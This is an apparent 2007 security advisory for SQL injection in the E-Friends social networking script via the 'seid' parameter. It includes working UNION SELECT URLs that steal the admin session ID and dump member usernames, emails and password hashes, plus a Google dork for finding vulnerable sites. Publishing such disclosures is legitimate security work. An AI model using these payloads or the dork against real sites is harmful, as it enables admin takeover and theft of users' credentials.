@@ -1,0 +1,95 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/
+
+                                        .OR.ID
+ECHO_ADV_85$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_85$2007] alstrasoft E-Friends  <= 4.98 (seid) Multiple Remote SQL Injection Vulnerabilities
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : November, 15 th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv85-K-159-2007.txt
+Critical Lvl   : Critical
+Impact           : System access Where           : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : E-Friends  
+version       : <= 4.98
+Vendor        : http://www.alstrasoft.com/efriends.htm
+Description :
+
+E-Friends is an online social networking script that allows you to start your own profitable community just like Friendster and MySpace social networking site plus the ability to offer paid membership subscriptions. E-Friends allow members to connect to people in their personal networks and make friends, match making, dating, blogging and join groups and events. Features include email importer, messaging system, classifieds, join groups, forums, affiliate program integrated, online chat, personal blog, calendar, custom profile URL, friends search, invite friends, hotornot image ranking, advance admin control panel, upload photos and many more.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "seid" parameter in events modules is not properly verified before being used to sql query.
+This can be exploited thru the browser and get the hash md5 password from members and retrieve admin session id.
+Successful exploitation requires that "magic_quotes" is off.
+
+
+Poc/Exploit:
+~~~~~~~~~
+1.Retrieve Admin SessionID :
+
+http://target.com/index.php?mode=events&act=viewevent&seid=-1%20union%20select%201,2,3,sess_id,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%20from%20admin--
+
+Use the SessionID in this URL:
+http://target.com/admin.php?mode=users_manager&adsess=SESSION_ID
+
+2.Get Members's Username and md5 hash:
+http://target.org/index.php?mode=events&act=viewevent&seid=-1%20union%20select%201,2,3,concat(mem_id,0x3a,username,0x3a,email,0x3a,password,0x3a,fname),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%20from%20members--
+
+
+
+Dork:
+~~~~
+Google  : "JOIN OUR SITE Today. It's FREE!"
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn on magic_quotes in php.ini
+ 
+
+Timeline:
+~~~~~~~~
+
+- 15 -11 - 2007 bug found
+- 21 -11 - 2007 vendor contacted
+- 22 -11 - 2007 publish advisory
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, 'zizou' zautha - my lovely son, for all the luv, the tears n the breath
+~ y3dips,the_day,m0by,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry,ketut,x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-11-21]
